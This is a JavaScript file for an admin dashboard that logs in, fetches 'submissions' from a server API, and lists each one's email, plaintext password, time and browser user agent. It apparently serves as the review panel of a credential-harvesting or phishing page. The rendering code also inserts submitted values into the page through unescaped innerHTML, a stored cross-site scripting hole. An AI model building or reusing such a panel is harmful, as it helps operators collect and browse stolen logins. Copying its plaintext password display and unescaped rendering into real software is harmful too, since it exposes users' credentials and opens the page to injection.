const loginSection = document.getElementById('login-section');
const dashboardSection = document.getElementById('dashboard-section');
const loginForm = document.getElementById('admin-login-form');
const loginMessage = document.getElementById('login-message');
const submissionsBody = document.getElementById('submissions-body');
const submissionCount = document.getElementById('submission-count');
const refreshButton = document.getElementById('refresh-btn');
const logoutButton = document.getElementById('logout-btn');

function showDashboard() {
    loginSection.classList.add('hidden');
    dashboardSection.classList.remove('hidden');
}

function showLogin() {
    dashboardSection.classList.add('hidden');
    loginSection.classList.remove('hidden');
}

function formatDate(value) {
    if (!value) return '-';
    return new Date(value).toLocaleString();
}

function renderSubmissions(submissions) {
    submissionCount.textContent = submissions.length;

    if (!submissions.length) {
        submissionsBody.innerHTML = '<tr><td colspan="5">No submissions yet.</td></tr>';
        return;
    }

    submissionsBody.innerHTML = submissions.map(submission => `
        <tr>
            <td>${submission.id}</td>
            <td>${submission.email}</td>
            <td>${formatDate(submission.submittedAt)}</td>
            <td>${submission.password || '-'}</td>
            <td class="muted">${submission.userAgent || '-'}</td>
        </tr>
    `).join('');
}

async function loadSubmissions() {
    const response = await fetch('/api/admin/submissions');

    if (response.status === 401) {
        showLogin();
        return;
    }

    const result = await response.json();
    if (!response.ok) {
        throw new Error(result.message || 'Unable to load submissions.');
    }

    showDashboard();
    renderSubmissions(result.submissions);
}

loginForm.addEventListener('submit', async (event) => {
    event.preventDefault();
    loginMessage.textContent = '';

    const username = document.getElementById('admin-username').value.trim();
    const password = document.getElementById('admin-password').value;

    try {
        const response = await fetch('/api/admin/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        });
        const result = await response.json();

        if (!response.ok) {
            throw new Error(result.message || 'Admin login failed.');
        }

        loginForm.reset();
        await loadSubmissions();
    } catch (error) {
        loginMessage.textContent = error.message;
    }
});

refreshButton.addEventListener('click', () => {
    loadSubmissions().catch(error => {
        alert(error.message);
    });
});

logoutButton.addEventListener('click', async () => {
    await fetch('/api/admin/logout', { method: 'POST' });
    showLogin();
});

loadSubmissions().catch(() => {
    showLogin();
});
